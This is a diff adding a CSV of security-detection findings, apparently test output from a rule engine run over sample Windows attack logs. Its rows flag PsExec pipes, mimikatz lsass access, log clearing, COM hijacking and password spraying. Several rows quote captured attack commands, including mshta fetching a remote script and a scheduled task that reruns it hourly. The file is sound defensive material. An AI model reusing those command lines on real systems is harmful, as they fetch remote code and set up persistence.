@@ -1,0 +1,22 @@
+time,file,computer,severity,rule,mitre,summary
+2019-01-19 13:00:10.711208+00:00,LM_renamed_psexecsvc_5145.evtx,IEWIN7,high,psexec_like_pipe_over_smb,T1569.002,10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stdin' as IEUser
+2019-01-19 13:00:10.711208+00:00,LM_renamed_psexecsvc_5145.evtx,IEWIN7,high,psexec_like_pipe_over_smb,T1569.002,10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stdout' as IEUser
+2019-01-19 13:00:10.711208+00:00,LM_renamed_psexecsvc_5145.evtx,IEWIN7,high,psexec_like_pipe_over_smb,T1569.002,10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stderr' as IEUser
+2019-03-17 19:37:11.661928+00:00,sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx,PC04.example.corp,critical,lsass_access,T1003.001,C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe opened lsass with 0x00001010
+2019-03-18 22:15:49.676748+00:00,LM_WMI_4624_4688_TargetHost.evtx,WIN-77LTAPHIQ1R.example.corp,medium,wmi_child_process,T1047,WmiPrvSE spawned C:\Windows\System32\calc.exe (remote WMI exec?)
+2019-03-19 23:35:07.524200+00:00,DE_1102_security_log_cleared.evtx,PC01.example.corp,high,security_log_cleared,T1070.001,Security log cleared by ?
+2019-05-21 00:35:07.474159+00:00,persist_firefox_comhijack_sysmon_11_13_7_1.evtx,IEWIN7,high,com_hijack_hkcu,T1546.015,C:\Users\IEUser\Downloads\com-hijack.exe set HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32\(Default) = C:\ProgramData\demo.dll
+2019-05-21 15:32:57.286253+00:00,exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,IEWIN7,high,lolbin_proxy_exec,T1218,"C:\Windows\System32\rundll32.exe: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WScript.Shell"").run("""
+2019-05-21 15:32:57.867088+00:00,exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,IEWIN7,high,lolbin_proxy_exec,T1218,"C:\Windows\System32\mshta.exe: ""C:\Windows\System32\mshta.exe"" https://hotelesms.com/talsk.txt"
+2019-05-21 15:32:59.769825+00:00,exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,IEWIN7,medium,scheduled_task_created,T1053.005,"""C:\Windows\System32\schtasks.exe"" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR ""mshta.exe https://hotelesms.com/Injection.txt"" /F"
+2020-06-30 14:24:08.254604+00:00,Powershell_4104_MiniDumpWriteDump_Lsass.evtx,MSEDGEWIN10,high,suspicious_scriptblock,T1059.001,PowerShell script block contains ['MiniDumpWriteDump']
+2020-07-22 20:29:27.321770+00:00,kerberos_pwd_spray_4771.evtx,01566s-win16-ir.threebeesco.com,high,security_log_cleared,T1070.001,Security log cleared by ?
+2020-07-22 20:29:36.414827+00:00,kerberos_pwd_spray_4771.evtx,01566s-win16-ir.threebeesco.com,high,password_spray,T1110.003,9 failures across 9 accounts from kerb:172.16.66.1
+2020-09-16 09:31:19.133272+00:00,DE_Fake_ComputerAccount_4720.evtx,01566s-win16-ir.threebeesco.com,medium,computer_account_via_4720,T1136.002,01566S-WIN16-IR$ created account $ (machine-style name via user-creation API)
+2020-09-16 09:32:13.647154+00:00,DE_Fake_ComputerAccount_4720.evtx,01566s-win16-ir.threebeesco.com,medium,computer_account_via_4720,T1136.002,01566S-WIN16-IR$ created account $ (machine-style name via user-creation API)
+2020-09-27 13:42:01.092665+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stdin by C:\Windows\svchost.exe
+2020-09-27 13:42:01.093184+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stdout by C:\Windows\svchost.exe
+2020-09-27 13:42:01.093922+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stderr by C:\Windows\svchost.exe
+2020-09-27 13:42:01.182772+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stdin by C:\Windows\system32\PsExec.exe
+2020-09-27 13:42:01.182880+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stdout by C:\Windows\system32\PsExec.exe
+2020-09-27 13:42:01.182989+00:00,DE_renamed_psexec_service_sysmon_17_18.evtx,MSEDGEWIN10,high,psexec_like_named_pipe,T1569.002,pipe \svchost-MSEDGEWIN10-8116-stderr by C:\Windows\system32\PsExec.exe
